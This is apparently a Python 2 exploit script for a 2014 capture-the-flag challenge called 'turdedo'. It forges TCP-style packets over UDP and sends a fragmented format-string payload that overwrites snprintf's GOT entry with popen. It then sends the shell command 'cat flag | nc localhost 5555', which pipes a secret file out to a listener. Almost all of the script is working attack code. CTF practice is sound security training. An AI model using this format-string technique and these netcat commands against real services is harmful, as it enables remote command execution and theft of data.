#!/usr/bin/python 
# -*- coding:utf-8 -*-
import socket, struct, sys, ctypes
import hashlib, time, thread

p   = lambda x: struct.pack(">L", x)
ph  = lambda x: struct.pack(">H", x)
pb  = lambda x: struct.pack(">b", x)

def recvmsg(mesg) : 
	# message 
	print mesg[48:],

#HOST = 'turdedo_5f55104b1d60779dbe8dcf5df2b186ad.2014.shallweplayaga.me' 
HOST = '127.0.0.1'
PORT = 3544 

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((HOST, PORT))

def fake_tcp(s, cmd='SYN', flag=0x11, frg_end=0, msg_index=80) : 
	ipaddr = socket.inet_aton("54.255.187.190")
	size = 8 + len(cmd)
	
	# header =  40 byte
	'''
	+-------+-------+-------+-------+-------+-------+-------+-------+
	|	"AAAA"			| m_size        | flag  |  "B"  |  flag = 0x21 or 0x11
	+-------+-------+-------+-------+-------+-------+-------+-------+
	|								|
	+		 		sender ip			+
	|								|
	+-------+-------+-------+-------+-------+-------+-------+-------+
	|								|
	+		 		dest ip				+
	|								|
	+-------+-------+-------+-------+-------+-------+-------+-------+
	'''
	header = "A"*4		
	header += ph(size)	#2	
	header += pb(flag)	#1	
	header += "B"		#1
	header += "D"*16
	header += p(0x20010000) 			
	header += ipaddr						
	header += p(0x0000F227)					
	header += p(~((struct.unpack(">L",ipaddr)[0]))&0xffffffff)

	if flag == 0x11 : 
		# msg head = 8 byte
		'''
		+-------+-------+-------+-------+-------+-------+-------+-------+
		|	"aa"	|   	PORT 	| 	size 	|	"bb"	| 
		+-------+-------+-------+-------+-------+-------+-------+-------+
		'''
		msg2 = "aa";  		#2
		msg2 += ph(PORT)	#2
		msg2 += ph(size)	#2
		msg2 += "bb"		#2
	else :  # 0x2c
		# msg head = 8 byte
		'''
		+-------+-------+-------+-------+-------+-------+-------+-------+
		|    \x11\x22	|   fragment	| 	size 	|	"bb"	| 
		+-------+-------+-------+-------+-------+-------+-------+-------+
		'''
		msg2 = "\x11\x11";  		#2
		val1 = msg_index			# message pointer 쯤 됨 	
		msg2 += ph(val1 | frg_end)	#2
		msg2 += ph(size)	#2
		msg2 += "bb"		#2
	
	# msg 
	msg2 += cmd
	msg = header + msg2
	
	s.send(msg)

# 3-way handshake 
fake_tcp(s, "SYN")
recv_msg = s.recv(1024)
recvmsg(recv_msg)

fake_tcp(s, recv_msg[51:51+14])
recvmsg(s.recv(1024))

# snprintf.got = 0x804AB8B (popen)
cmd = "echo    "+"\x9c\xe0\x04\x08\x9d\xe0\x04\x08\x9e\xe0\x04\x08%1$124x%16$hn%1$32x%17$hn%1$1881x%18$hn"
cmd += " "*( 8 - (len(cmd) % 8)) 	# size align 

msg_header = "aa"		#2 
msg_header += ph(PORT)		#2
msg_header += ph(len(cmd)+8)	#2
msg_header += "bb"		#2

# send fragmented messsage
for i in range(len(cmd), 0, -8) : 
	w=i-8
	m=cmd[w:w+8]
	#print m, len(m), i
	fake_tcp(s, m, 0x2c, 1, i) 

# send last fragmented messsage
fake_tcp(s, msg_header, 0x2c, 0, 0) 
recvmsg(s.recv(9999))

# send command  
fake_tcp(s,'echo "A"; cat flag | nc localhost 5555')
recvmsg(s.recv(9999))

